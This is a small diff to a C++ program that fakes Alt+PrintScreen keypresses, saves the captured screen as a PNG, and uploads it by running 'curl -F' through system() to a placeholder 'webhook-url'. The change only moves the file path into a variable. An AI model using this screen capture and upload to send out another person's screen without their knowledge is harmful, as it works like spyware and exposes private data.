@@ -11,7 +11,7 @@ int main()
 {
 	//header
     const string cmd_2 = "curl -F \"file1=@";
-
+	string image_Url = "W:\\Code\\RandomProjects\\Screenshot.png";
 	//capture screenshot
 	keybd_event(VK_MENU, 0, 0, 0); //Alt Press
 	keybd_event(VK_SNAPSHOT, 0, 0, 0); //PrntScrn Press
@@ -36,11 +36,11 @@ int main()
 	IStream_Read(stream, &buf[16], len);
 	stream->Release();
 	std::fstream fi;
-	fi.open("W:\\Code\\RandomProjects\\Screenshot.png", std::fstream::binary | std::fstream::out);
+	fi.open(image_Url, std::fstream::binary | std::fstream::out);
 	fi.write(reinterpret_cast<const char*>(&buf[16]), buf.size() * sizeof(BYTE));
 	fi.close();
 	std::this_thread::sleep_for(std::chrono::milliseconds(40));
 
-	string command = cmd_2 + "W:\\Code\\RandomProjects\\Screenshot.png" + "\" " + "webhook-url";
+	string command = cmd_2 + image_Url + "\" " + "webhook-url";
 	system(command.c_str());
 }
